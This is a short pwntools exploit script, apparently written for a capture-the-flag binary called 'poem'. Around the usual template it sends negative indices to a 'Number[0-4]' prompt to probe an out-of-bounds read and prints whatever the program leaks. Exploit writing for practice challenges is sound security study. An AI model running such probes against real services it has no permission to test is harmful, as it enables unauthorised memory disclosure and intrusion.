from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or "./poem")

banner = "Number[0-4]: "

host = args.HOST or "localhost"
port = int(args.PORT or 9000)

# --- (do not exit) ---------------------------------------------------

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
# ./exploit.py LOCAL

def start_local(argv=[], *a, **kw):
    """Execute the target binary locally"""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    """Connect to the process on the remote host"""
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
tbreak main
continue
""".format(
    **locals()
)

# --- (do not exit) ---------------------------------------------------

# EXPLOIT GOES HERE
for i in range(-1, -5, -1):
    io = start()

    io.sendlineafter(banner, str(i))
    print(f"i = {i}")
    try:
        print(io.recvline())
        # break
    except EOFError:
        continue
    finally:
        io.close()
